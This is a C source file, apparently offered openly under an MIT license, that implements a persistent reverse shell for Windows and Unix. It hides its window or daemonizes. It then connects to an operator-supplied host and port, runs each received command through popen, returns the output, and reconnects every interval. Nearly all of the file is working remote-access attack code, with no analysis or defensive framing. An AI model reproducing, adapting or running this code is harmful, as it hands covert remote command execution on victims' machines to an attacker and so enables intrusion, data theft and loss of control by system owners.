/*
 * MIT License
 * Copyright (c) 2018 Zhang Yi Da
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
  #include <winsock2.h>
  #include <windows.h>
  #define popen _popen
  #define pclose _pclose
  #define close closesocket
  #define sleep(S) Sleep(S * 1000)
  #pragma comment(lib, "ws2_32.lib")
  #pragma comment(lib, "user32.lib")
#else
  #include <unistd.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
#endif

typedef struct sockaddr sockaddr;
typedef struct sockaddr_in sockaddr_in;

void reverse_console(char* ip, short port) {
  FILE* pipe;
  sockaddr_in sin;
  char buffer[4096*2];
  int sockfd, bytes_recv = 0, bytes_read = 0;

#ifdef WIN32
  WSADATA wsad;
  WSAStartup(MAKEWORD(2, 2), &wsad);
#endif

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
    // prepare connect.
    sin.sin_family = AF_INET;
  	sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(ip);
    if (connect(sockfd, (const sockaddr*)&sin, sizeof(sockaddr_in)) != -1) {
      while (6) {
        memset(buffer, 0, sizeof(buffer));
        if ((bytes_recv = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
          if ((pipe = (FILE*)popen(buffer, "r")) != NULL) {
            if ((bytes_read = fread(buffer, 1, 4096*2, pipe)) <= 0) {
              bytes_read = 1;
              buffer[0] = 0xff;
            }
             // close pipe first.
            pclose(pipe);
            if(send(sockfd, buffer, bytes_read, 0) <= 0)
              break;
          }
        } else {
          break;
        }
      }
      close(sockfd);
#ifdef WIN32
      WSACleanup();
#endif
    }
  }
}

int main(int argc, char* argv[]) {
  char *host;
  int port = 36987, t;
  int interval = 60;
  char buff[512] = {0};
  char sep[2] = ":", *next;
  // no argument provided, default address;
  // example: char *fixed_cmdline = "127.0.0.1:12369:360";
  char *fixed_cmdline = NULL;
#ifdef WIN32
  // run in background.
  HANDLE hWnd = GetForegroundWindow();
  ShowWindow(hWnd, SW_HIDE);
#else
  daemon(0, 0);
#endif
  if (argc > 1) {
    strncpy(buff, argv[1], sizeof(buff));
  } else if (fixed_cmdline) {
    strncpy(buff, fixed_cmdline, sizeof(buff));
  }
  if ((host = strtok(buff, sep)) != NULL) {
    // parse port
    next = strtok(NULL, sep);
    if (next && (t = atoi(next)) != 0)
      port = t;

    // parse sleep interval
    next = strtok(NULL, sep);
    if (next && (t = atoi(next)) != 0)
      interval = t;

    while (6) {
      reverse_console(host, (short)port);
      sleep(interval);
    }
  }
  return 0;
}
